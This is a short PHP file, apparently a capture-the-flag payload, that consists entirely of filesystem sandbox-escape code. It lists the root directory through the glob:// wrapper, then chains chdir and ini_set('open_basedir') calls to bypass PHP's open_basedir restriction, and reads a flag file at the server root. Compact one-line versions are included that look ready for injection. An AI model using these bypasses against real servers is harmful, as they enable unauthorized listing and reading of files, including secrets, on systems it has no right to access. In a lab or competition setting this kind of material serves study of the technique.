<?php
        $a = "glob:///*";
        if ( $b = opendir($a) ) {
                while ( ($file = readdir($b)) !== false ) {
                        echo "filename:".$file."\n";
                }
                closedir($b);
        }
        $a = "glob:///*";if ( $b = opendir($a) ) {while ( ($file = readdir($b)) !== false ) {echo "filename:".$file."\n";}closedir($b);}
        $a = "glob:///THis_Is_tHe_F14g";if ( $b = opendir($a) ) {while ( ($file = readdir($b)) !== false ) {echo "filename:".$file."\n";}closedir($b);}
        chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));
        chdir('img');ini_set('open_basedir','/');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file('/THis_Is_tHe_F14g'));
?>